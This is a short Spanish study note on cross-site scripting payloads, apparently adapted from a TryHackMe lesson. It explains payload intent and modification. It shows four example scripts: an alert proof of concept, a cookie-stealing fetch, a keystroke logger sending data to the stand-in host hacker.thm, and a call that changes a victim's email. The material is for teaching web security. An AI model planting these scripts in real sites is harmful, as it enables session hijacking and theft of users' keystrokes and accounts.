---
layout: apunte
title: "2. XSS Payloads"
---

<h2>¿Qué es un Payload?</h2>
En XSS, el payload es el código JavaScript que se ejecuta en el ordenador del objetivo. Hay dos partes de un payload, la intención y la modificación.

La intención es lo que querrías que JavaScript hiciera y la modificación son los cambios que debemos hacerle al código para que se ejecute porque cada escenario es diferente.

Algunos ejemplos de Intenciones:

<h4>Proof of Concept (PoC)</h4>
Es el payload más simple donde lo único que quieres es demostrar que puedes conseguir XSS en un sitio web. Esto, normalmente es hecho causando una caja de alerta que popea en la página con una string de texto, por ejemplo:

```javascript
<script>alert('XSS');</script>
```

<h4>Robo de Sesión</h4>
Los detalles de sesión de un usuario, como los tokens de inicio de sesión, normalmente se guardan en la máquina del objetivo en cookies. El código JavaScript de debajo coge el valor de la cookie del objetivo, la base64-encodea para asegurar la transmisión y las postea (`POST`) hacia un sitio web bajo el dominio del hacker. Una vez que el hacker tiene las cookies, pueden tomar la sesión de ese usuario y "ser" ese usuario.

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

<h4>KeyLogger</h4>
El código de abajo actúa como un KeyLogger (registrador de teclas). Esto significa que todo lo que teclees en una página será redirigido hacia el sitio web bajo el control del atacante. Esto sería especialmente dañino si el código fuera instalado en una página de registro o de compra, por ejemplo.

```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

<h4>Business Logic</h4>
Este payload es mucho más específico que los ejemplos de arriba. Este iría de llamar a un recurso de red particular o función de JavaScript. Por ejemplo, imagina una función de JavaScript para cambiar la dirección de correo electrónico del usuario llamada `user.changeEmail()`. Tu payload podría verse así:

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Ahora que la dirección de correo electrónico para la cuenta ha cambiado, el atacante puede proceder a cambiar la contraseña.

